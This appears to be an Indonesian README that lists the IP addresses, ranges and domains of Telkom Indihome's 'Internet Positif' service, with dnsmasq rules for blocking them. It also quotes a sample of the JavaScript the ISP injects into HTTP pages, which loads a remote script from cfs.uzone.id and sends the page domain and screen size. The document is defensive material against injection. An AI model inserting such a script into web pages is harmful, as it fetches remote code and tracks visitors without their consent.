# IP dan Domain Internet Positif 

## Daftar IP Internet Positif Telkom Indihome
```
118.97.116.10
118.97.116.2
118.97.116.27
202.69.110.78
36.66.1.2 # welcome.indihome.co.id
36.66.1.10 # upoint.id
36.86.63.180
36.86.63.181 # uzone
36.86.63.182 # mercusuar.uzone.id
36.86.63.184 # a03.uadexchange.com
118.97.116.28 # a02.uadexchange.com
13.228.245.212 # wildcard uadexchange.com
36.86.63.185 # internetpositif.uzone.id
36.86.63.186 # uzone.id

```

## Daftar DOMAIN Internet Positif Telkom Indihome

```
a01.uadexchange.com
a03.uadexchange.com
cdn.uzone.id
cdn1.uzone.id
cdn2.uzone.id
cdn3.uzone.id
cdn4.uzone.id
cdn5.uzone.id
cfs.uzone.id
csf.uzone.id
d01.notifa.info
d31qbv1cthcecs.cloudfront.net
d5nxst8fruw4z.cloudfront.net
expose.uzone.id
kendedes.uzone.id
mercusuar.uzone.id
p01.notifa.info
p02.notifa.info
p03.notifa.info
p05.notifa.info
usearch.co.id
uadexchange.com
welcome.indihome.co.id
upoint.id
uzone.id
```

# Blokir /24
Range yang digunakan Internet Positif ada di 
```
118.97.116.0/24
36.86.63.0/24
```
jadi mending blok semuanya ;)

## Dnsmasq
Untuk memblokir domain/subdomain tambahkan di `dnsmasq.conf`
```
address=/notifa.info/0.0.0.0
address=/uzone.id/0.0.0.0
```
dengan konfigurasi diatas, semua subdomain (wildcard) dibawah contoh notifa.info akan di blokir, seperti 
```
p02.notifa.info
p03.notifa.info
p05.notifa.info
d01.notifa.info
blablablabla.notifa.info
random.apa.notifa.info
google.domain.apa.notifa.info
```


# Script JS
contoh script yang di inject ke http
```
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHa6dUEiP6K%2fc5C582CL4NjpNgssKlLXmbTBE8IzDXCSPaiFHvyt8Q5fsYRny8X3ds6Lr7ToQwJBBAp5P%2bjKK12yr0FxrJb1ixNQVSm4FoVHOKcl3FNknXhjy%2bbVesNHJhD0cCTqdRhNvFS0F6iEXZjxMPE3QuLIQu%2frXcHuCJy3hLU4QFreC0HijsnOoLN%2ftyF0wyfyQL9NHY5W5Br2BHrjRKwDTSCJyVRi2MgeTRvJMZVrSHP%2fCKKzZJVTdtpmz9FQNiKCuhOcpWNNB2wEs1InhywhlXi%2bg%2fLs%2fI2ie5DhFiM%2fgiztMMQzXL11mHZirYErQELDIzGuYbIPcenKjW9OvxhUTTu%2bhOUc1nVkHoQAGhL0XfVqhaDPXofJbg9VGJdSA3sUnqqb%2fETChCJuhAL772tWxEYNBTEEb4lmYvGTg9WtXovN8WJhpghbYXxaRdpGeF77EkYtES3Fgvx3BJKDBSVCoLZ9Im4O5XCwtGWuPTsZfC8EiyYqCTAWPdaoqalbgI0gmD31qSGRwIq03O%2f2JQPFAx6bGaHg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
```
solusinya gunakan **DNSCrypt** atau bagi pemilik website gunakan SSL (https) biar ngga bisa di inject oleh telkom.
